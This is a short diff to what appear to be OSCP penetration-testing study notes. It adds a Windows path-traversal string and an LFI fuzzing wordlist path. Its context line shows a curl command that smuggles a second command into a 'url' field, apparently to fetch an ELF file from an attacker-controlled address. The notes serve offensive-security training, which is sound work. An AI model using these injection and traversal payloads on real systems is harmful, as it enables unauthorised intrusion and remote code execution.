@@ -1019,6 +1019,8 @@ curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;n
   - Make sure to check file extension(.py, .js, .conf, .config...)
 - Files to Check on windows
   - C:/Windows/System32/drivers/etc/hosts
+  - ../../../../../../../../../Windows/System32/drivers/etc/hosts
+  - /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
 - Files to check on linux
   - ![image](https://github.com/nuricheun/OSCP/assets/14031269/6f634499-c15a-4424-adae-df9013031d02)
 
